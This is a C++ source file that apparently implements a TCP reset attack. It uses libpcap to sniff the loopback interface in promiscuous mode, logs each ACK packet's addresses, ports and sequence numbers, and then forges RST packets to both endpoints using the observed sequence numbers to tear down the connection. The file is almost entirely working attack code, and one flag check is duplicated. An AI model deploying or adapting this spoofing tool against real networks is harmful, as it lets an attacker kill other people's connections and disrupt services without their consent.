#include <pcap.h>
#include "packetSender.cpp"

void processPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
	struct spoofedcontent spoofedContent;
	struct in_addr sourceIP, destinationIP;
	int size = header->len;
	struct ipheader *ipHeader = (struct ipheader*)(buffer + sizeof(struct ethernetheader));
	struct tcpheader *tcpHeader = (struct tcpheader*)(buffer + sizeof(struct ipheader) + sizeof(struct ethernetheader));
	if(ipHeader->protocol == 6)
	{
		if(tcpHeader->flag_ACK && !(tcpHeader->flag_PSH  || tcpHeader->flag_PSH || tcpHeader->flag_FIN))
		{
			sourceIP.s_addr = ipHeader->sourceIPAddress;
			destinationIP.s_addr = ipHeader->destinationIPAddress;
		
			cout << "---------------------------" << endl;
			cout << "Received ack packet :D" << endl;
			cout << "Source IP: " << inet_ntoa(sourceIP) << " Destination IP: " << inet_ntoa(destinationIP) << endl;
		    cout << "Source port: " << ntohs(tcpHeader->sourcePort) << " Destination port: " << ntohs(tcpHeader->destinationPort) << endl;
			cout << "Sequence number: " << ntohl(tcpHeader->sequenceNumber) << " Ack number: " << ntohl(tcpHeader->ackNumber) << endl;
            cout << "---------------------------" << endl;

			// Sending reset packet to sender
            spoofedContent.sourceIPAddress = ipHeader->sourceIPAddress;
			spoofedContent.destinationIPAddress = ipHeader->destinationIPAddress;
			spoofedContent.sourcePort = tcpHeader->sourcePort;
			spoofedContent.destinationPort = tcpHeader->destinationPort;
			spoofedContent.sequenceNumber = tcpHeader->sequenceNumber;
			spoofedContent.ackNumber = tcpHeader->ackNumber;
            sendResetPacket(spoofedContent);

			// Sending reset packet to receiver
			spoofedContent.sourceIPAddress = ipHeader->destinationIPAddress;
			spoofedContent.destinationIPAddress = ipHeader->sourceIPAddress;
			spoofedContent.sourcePort = tcpHeader->destinationPort;
			spoofedContent.destinationPort = tcpHeader->sourcePort;
			spoofedContent.sequenceNumber = tcpHeader->ackNumber;
			spoofedContent.ackNumber = tcpHeader->sequenceNumber;
			sendResetPacket(spoofedContent);
		}
	}
}

int main(int argc, char *argv[])
{
    pcap_t *handle;						// Session handle 
	char dev[]="lo";					// The device to sniff on 
	char errbuf[PCAP_ERRBUF_SIZE];		// Error string 
	struct bpf_program fp;				// The compiled filter 
	char filter_exp[] = "";				// The filter expression 
	bpf_u_int32 mask;					// Our netmask 
	bpf_u_int32 net;					// Our IP 
	struct pcap_pkthdr header;			// The header that pcap gives us 
	const u_char *packet;				// The actual packet 
		
	/* Find the properties for the device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) 
    {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) 
    {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) 
    {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	
	cout << "Running sniffer-----------" << endl;
	pcap_loop(handle, -1, processPacket, NULL);
		
	return(0);
}